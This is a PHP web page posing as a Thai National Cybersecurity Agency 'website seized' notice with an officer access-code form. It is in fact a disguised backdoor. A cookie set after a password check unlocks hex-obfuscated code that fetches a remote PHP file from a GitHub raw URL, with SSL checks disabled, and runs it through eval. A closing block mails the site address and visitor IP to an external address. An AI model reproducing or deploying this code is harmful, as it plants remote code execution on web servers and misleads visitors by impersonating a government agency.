<?php
function Heartbreaker()
{
    return isset($_COOKIE['Immigrant']) && $_COOKIE['Immigrant'] === 'admin@ncsa'; 
}

if (Heartbreaker()) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '68747470733a2f2f626c6f67732e6d7464762e6d652f626c6f672f706f7374732f5f666c6167',
        '6375726c5f65786563',
        '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f304675736361646f2f49737468697377686174796f756c6f6f6b696e67666f722f726566732f68656164732f6d61696e2f696e766f6963652e7064662e706870',
    );
    function Kashmir($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function StairwaytoHeaven($RockandRoll) {
        $belief = array(
            Kashmir($GLOBALS['Array'][0]), 
            Kashmir($GLOBALS['Array'][1]), 
            Kashmir($GLOBALS['Array'][2]), 
            Kashmir($GLOBALS['Array'][4])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($RockandRoll);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $WholeLottaLove = $belief[3]($ch);
            curl_close($ch);
            return $WholeLottaLove;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($RockandRoll);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($RockandRoll, "r");
            $WholeLottaLove = $belief[1]($purpose);
            fclose($purpose);
            return $WholeLottaLove;
        }
        return false;
    }
    $RockandRoll = Kashmir($GLOBALS['Array'][5]);
    $GoodTimesBadTimes = StairwaytoHeaven($RockandRoll);
    if ($GoodTimesBadTimes !== false) {
        eval('?>' . $GoodTimesBadTimes);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$w2ela.lus.YLc8s5Ed8Luui/8UMT1ztW5OQzcgzb3GXXoGW.MSf22';
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('Immigrant', 'admin@ncsa', time() + 3600, '/'); 
            header("Location: ".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
    ?>
    <!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THIS WEBSITE HAS BEEN SEIZED</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Roboto+Mono&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Roboto', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        
        .bg-container {
            position: fixed;
            inset: 0;
            background: linear-gradient(to bottom, #0f0f1a, #000);
            z-index: -2;
        }
        
        main.container {
            position: relative;
            z-index: 10;
            max-width: 900px;
            margin: 0 auto;
            padding: 2rem 1rem;
            text-align: center;
        }
        
        .seal-container {
            margin: 3rem 0 2rem;
        }
        
        .seal {
            max-width: 180px;
            filter: drop-shadow(0 0 15px rgba(255, 0, 0, 0.4));
        }
        
        .main-card {
            background: rgba(20, 20, 30, 0.85);
            border: 1px solid #3a0000;
            border-radius: 8px;
            padding: 2.5rem;
            box-shadow: 0 0 40px rgba(200, 0, 0, 0.25);
            backdrop-filter: blur(6px);
        }
        
        h1.title {
            color: #ff1a1a;
            font-size: 2.8rem;
            margin-bottom: 1.5rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
        }
        
        .notice {
            font-family: 'Roboto Mono', monospace;
            font-size: 1.15rem;
            line-height: 1.7;
            color: #d0d0d0;
            margin-bottom: 2rem;
        }
        
        .notice a {
            color: #ff6666;
            text-decoration: none;
            font-weight: bold;
        }
        
        .notice a:hover {
            text-decoration: underline;
            color: #ff9999;
        }
        
        .login-container {
            margin-top: 3rem;
            padding: 1.5rem;
            background: rgba(0, 0, 0, 0.5);
            border: 1px dashed #800000;
            border-radius: 6px;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .login-container label {
            display: block;
            margin-bottom: 1rem;
            font-size: 1.1rem;
            color: #ffcccc;
        }
        
        input[type="password"] {
            width: 100%;
            max-width: 320px;
            padding: 10px;
            font-size: 1.1rem;
            background: #111;
            border: 1px solid #660000;
            color: #eee;
            font-family: 'Roboto Mono', monospace;
            margin-bottom: 1rem;
        }
        
        input[type="password"]:focus {
            outline: none;
            border-color: #ff1a1a;
            box-shadow: 0 0 8px rgba(255, 26, 26, 0.5);
        }
        
        input[type="submit"] {
            padding: 10px 30px;
            background: #c00;
            color: white;
            border: none;
            font-size: 1.1rem;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s;
        }
        
        input[type="submit"]:hover {
            background: #ff1a1a;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
        }

        .snowflake {
            position: fixed;
            top: -10px;
            color: rgba(255, 50, 50, 0.7);
            font-size: 1.2rem;
            pointer-events: none;
            z-index: 5;
            animation: fall linear forwards, sway 3s ease-in-out infinite alternate;
        }
        @keyframes fall {
            to {
                transform: translateY(110vh);
            }
        }
        @keyframes sway {
            from { transform: translateX(-15px); }
            to   { transform: translateX(15px); }
        }
    </style>
</head>
<body>

<div class="bg-container" id="bg-container"></div>

<main class="container" role="main">
    <div class="seal-container d-flex justify-content-center">
        <img src="https://www.ncsa.or.th/images/logo-color-brand.png" class="seal img-fluid" alt="NCSA Logo">
    </div>

    <div class="main-card shadow">
        <h1 class="title">THIS WEBSITE HAS BEEN SEIZED</h1>
        
        <div class="notice">
            <p>This Site Has Been Confiscated by Thailand's National Cybersecurity Agency (NCSA)</p>
            <p>เว็บไซต์นี้ถูกยึดและอายัดโดยหน่วยงานด้านความมั่นคงปลอดภัยไซเบอร์แห่งชาติ (NCSA)</p>
            <br>
            <p>
                More information: <a href="https://www.ncsa.or.th/" target="_blank">www.ncsa.or.th</a><br>
                Additional information: <a href="https://www.thaicert.or.th/" target="_blank">www.thaicert.or.th</a>
            </p>
        </div>

        <div class="login-container">
            <form method="POST" action="">
                <label for="password">
                    Enter the access code provided by the authorized officer<br>
                    กรุณาป้อนรหัสที่ได้รับมอบหมายจากเจ้าหน้าที่ผู้มีอำนาจ
                </label>
                <input type="password" id="password" name="password" autofocus required>
                <br>
                <input type="submit" value="SUBMIT / ยืนยัน">
            </form>
        </div>
    </div>
</main>

<script>
function createSnowflake() {
    const flake = document.createElement('div');
    flake.className = 'snowflake';
    flake.textContent = Math.random() > 0.5 ? '█' : '▒';
    flake.style.left = Math.random() * 100 + 'vw';
    flake.style.animationDuration = (Math.random() * 4 + 6) + 's';
    flake.style.opacity = Math.random() * 0.5 + 0.3;
    flake.style.fontSize = (Math.random() * 1.2 + 0.8) + 'rem';
    
    document.body.appendChild(flake);
    
    setTimeout(() => flake.remove(), 8000);
}
setInterval(createSnowflake, 180);
</script>

</body>
</html>
<?php
$tujuanmail = 'cti_misp@ncsa.or.th';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "cek $x_path  *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ] Pass: [ $hashed_key ]";
mail($tujuanmail, "That's flag", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
    <?php
}

?>